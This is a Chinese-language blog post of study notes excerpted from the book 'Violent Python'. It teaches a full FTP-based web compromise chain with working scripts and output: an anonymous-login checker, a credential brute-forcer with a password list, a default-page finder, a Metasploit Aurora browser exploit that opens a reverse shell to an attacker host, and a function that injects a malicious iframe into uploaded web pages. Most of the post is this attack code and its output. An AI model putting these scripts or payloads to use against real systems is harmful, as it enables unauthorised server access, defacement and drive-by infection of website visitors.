---
layout: post
title: "使用Python通过FTP进行Web渗透"
date: 2017-10-03 09:48:06 +0800
category: 学习笔记
---

> 节选自《python绝技：运用python成为顶级黑客》一书

在最近的一次巨大的损害中，被称为 k985ytv 的攻击者，使用匿名和盗用的FTP 凭证，获得了 22400 个域名和 536000 被感染的页面。利用授权访问，攻击者注入 Javascript 代码，使好的首页重定向到乌克兰境内的恶意页面。一旦受感染的服务器被重定向到恶意的网站，恶意的主机将会在受害者电脑中安装假冒的防病毒软件，并窃取受害者的信用卡信息。K985ytv 的攻击取得了巨大的成功。在下面的章节中，我们将用 Python 来建立这种攻击。

检查受感染服务器的 FTP 日志，我们看看到底发什么什么事。一个自动的脚本连接到目标主机以确认它是否包含一个名为 index.htm 的默认主页。接下来攻击者上传了一个新的 index.htm 页面，可能包含恶意的重定向脚本。受感染的服务器渗透利用任何访问它页面的脆弱客户机。

```
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "LIST / folderthis/folderthat/" 226 1862
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "TYPE I" 200 -
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "PASV" 227 -
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "SIZE index.htm" 213 -
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "RETR index.htm" 226 2573
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "TYPE I" 200 -
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "PASV" 227 -
204.12.252.138 UNKNOWN u47973886 [14/Aug/2011:23:19:27 -0500] "STORindex.htm" 226 3018
```

为了更好的理解这种攻击的初始向量。我们简单的来谈一谈 FTP 的特点。文件传输协议 FTP 服务用户在一个基于TCP 网络的主机之间传输文件。通常情况下，用户通过用户名和密码来验证 FTP 服务。然而，一些网站提供匿名认证的能力，在这种情况下，用户提供用户名为“anonymous”，用电子邮件来代替密码。

就安全而言，网站提供匿名的FTP服务器访问功能似乎很愚蠢。然而，令人惊讶的是许多网站提供这类FTP的访问如升级软件，这使得更多的软件获取软件的合法更新。我们可以利用Python的 ftplib 模块来构建一个小脚本，用来确认服务器是否允许匿名登录。函数 `anonLogin()` 接受一个主机名反汇编一个布尔值来确认主机是否允许匿名登录。为了确认这个布尔值，这个函数尝试用匿名认证生成一个FTP连接，如果成功，则返回 "True"，产生异常则返回 "False"。

```py
# coding=UTF-8
import ftplib
def anonLogin(hostname):
 try:
 ftp = ftplib.FTP(hostname)
 ftp.login('anonymous', 'me@your.com')
 print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded!')
 ftp.quit()
 return True
 except Exception as e:
 print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed!')
 return False
host = '192.168.95.179'
anonLogin(host)
```

运行这个脚本，我们可以看到脆弱的目标可以匿名登陆。

```py
attacker# python anonLogin.py
[*] 192.168.95.179 FTP Anonymous Logon Succeeded
```

**利用 Ftplib 暴力破解 FTP 用户认证**

当匿名登录一路回车进入系统，攻击者也十分成功的利用偷来的证书获得合法FTP服务器的访问权限。FTP客户端程序，比如说FileZilla，经常将密码存储在配置文件中。安全专家发现，由于最近的恶意软件，FTP证书经常被偷取。此外，HD Moore甚至将 get_filezilla_creds.rb 的脚本包含到最近的Metasploit的发行版本中允许用户快速的扫描目标主机的FTP证书。想象一个我们想通过暴力破解的包含 username/password 组合的文本文件。对于这个脚本的目的，利用存贮在文本文件中的 username/password 组合

```
administrator:password
admin:12345
root:secret
guest:guest
root:toor
```

现在我们能扩展前面建立的 anonLogin() 函数建立名为 brutelogin() 的函数。这个函数接受主机名和密码文件作为输入返回允许访问主机的证书。注意，函数迭代文件的每一行，用冒号分割用户名和密码，然后这个函数用用户名和密码尝试登陆FTP服务器。如果成功，将返回用户名和密码的元组，如果失败有异常，将继续测试下一行。如果遍历完所有的用户名和密码都没有成功，则返回包含 None 的元组。

```py
# coding=UTF-8
import ftplib
def bruteLogin(hostname, passwdFile):
 pF = open(passwdFile, 'r')
 for line in pF.readlines():
 userName = line.split(':')[0]
 passWord = line.split(':')[1].strip('\r').strip('\n')
 print("[+] Trying: " + userName + "/" + passWord)
 try:
 ftp = ftplib.FTP(hostname)
 ftp.login(userName, passWord)
 print('\n[*] ' + str(hostname) + ' FTP Logon
Succeeded: ' + userName + "/" + passWord)
 ftp.quit()
 return (userName, passWord)
 except Exception as e:
 pass
 print('\n[-] Could not brute force FTP credentials.')
 return (None, None)
host = '192.168.95.179'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)
```

遍历用户名和密码组合，我们终于找到了用户名以及对应的密码。

```
attacker# python bruteLogin.py
[+] Trying: administrator/password
[+] Trying: admin/12345
[+] Trying: root/secret
[+] Trying: guest/guest
[*] 192.168.95.179 FTP Logon Succeeded: guest/guest
```

**在 FTP 服务器上寻找 WEB 页面**

有了FTP访问权限，我们还要测试服务器是否还提供了WEB访问。为了测试这个，我们首先要列出FTP的服务目录并寻找默认的WEB页面。函数 returnDefault() 接受一个FTP连接作为输入并返回一个找到的默认页面的数组。它通过发送命令NLST列出目录内容。这个函数检查每个文件返回默认WEB页面文件名并将任何发现的默认WEB页面文件名添加到名为 retList 的列表中。完成迭代这些文件之后，函数将返回这个列表

```py
# coding=UTF-8
import ftplib
def returnDefault(ftp):
 try:
 dirList = ftp.nlst()
 except:
 dirList = []
 print('[-] Could not list directory contents.')
 print('[-] Skipping To Next Target.')
 return
 retList = []
  for fileName in dirList:
 fn = fileName.lower()
 if '.php' in fn or '.htm' in fn or '.asp' in fn:
 print('[+] Found default page: ' + fileName)
 retList.append(fileName)
 return retList
host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
returnDefault(ftp)
```

看着这个脆弱的FTP服务器，我们可以看到它有三个WEB页面在基目录下。好极了，我们知道可以移动我们的攻击向量到我们的被感染的页面。

```
attacker# python defaultPages.py
[+] Found default page: index.html
[+] Found default page: index.php
[+] Found default page: testmysql.php
```

**添加恶意注入脚本到 WEB 页面**

现在我们已经找到了WEB页面文件，我们必须用一个恶意的重定向感染它。为了快速的生成一个恶意的服务器和页面在 http://10.10.10.112:8080/exploit  页面，我们将使用Metasploit框架。注意，我们选择 ms10_002_aurora的Exploit,同样的Exploit被用在攻击Google的极光行动中。位与 http://10.10.10.112:8080/exploit 的页面将重定向到受害者，这将返回给我们一个反弹的Shell。

```
attacker# msfcli exploit/windows/browser/ms10_002_aurora
 LHOST=10.10.10.112 SRVHOST=10.10.10.112 URIPATH=/exploit
 PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112
LPORT=443 E
[*] Please wait while we load the module tree...
<...SNIPPED...>
LHOST => 10.10.10.112
SRVHOST => 10.10.10.112
URIPATH => /exploit
PAYLOAD => windows/shell/reverse_tcp
LHOST => 10.10.10.112
LPORT => 443
[*] Exploit running as background job.
[*] Started reverse handler on 10.10.10.112:443
[*] Using URL:http://10.10.10.112:8080/exploit
[*] Server started.
msf exploit(ms10_002_aurora) >
```

任何脆弱的客户机连接到我们的服务页面 http://10.10.10.112:8080/exploit 都将会落入我们的陷阱中。如果成功，它将建立一个反向的TCP Shell并允许我们远程的在客户机上执行Windows命令。从这个命令行Shell我们能在受感染的受害者主机上以管理员权限执行命令。

```py
msf exploit(ms10_002_aurora) > [*] Sending Internet Explorer
"Aurora"
 Memory Corruption to client 10.10.10.107
[*] Sending stage (240 bytes) to 10.10.10.107
[*] Command shell session 1 opened (10.10.10.112:443 ->
 10.10.10.107:49181) at 2012-06-24 10:05:10 -0600
msf exploit(ms10_002_aurora) > sessions -i 1
[*] Starting interaction with 1...
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\Documents and Settings\Administrator\Desktop>
```

接下来，我们必须添加一个重定向从被感染的主机到我们的恶意的服务器。为此，我们可以从攻陷的服务器下载默认的WEB页面，注入一个 iframe ，然后上传恶意的页面到服务器上。看看这个  injectPage() 函数，它接受一个FTP连接，一个页面名和一个重定向的 iframe 的字符串作为输入，然后下载页面作为临时副本，接下来，添加重定向的 iframe 代码到临时文件中。最后，该函数上传这个被感染的页面到服务器中。


```py
# coding=UTF-8
def injectPage(ftp, page, redirect):
 f = open(page + '.tmp', 'w')
 ftp.retrlines('RETR ' + page, f.write)
 print '[+] Downloaded Page: ' + page
 f.write(redirect)
 f.close()
 print '[+] Injected Malicious IFrame on: ' + page
 ftp.storlines('STOR ' + page, open(page + '.tmp'))
 print '[+] Uploaded Injected Page: ' + page
host = '192.168.95.179'
userName = 'guest'
passWord = 'guest'
ftp = ftplib.FTP(host)
ftp.login(userName, passWord)
redirect = '<iframe
src="http://10.10.10.112:8080/exploit"></iframe>'
injectPage(ftp, 'index.html', redirect)
```

运行我们的代码，我们可以看到它下载 index.html 页面然后注入我们的恶意代码到里面。

```
attacker# python injectPage.py
[+] Downloaded Page: index.html
[+] Injected Malicious IFrame on: index.html
[+] Uploaded Injected Page: index.html 
```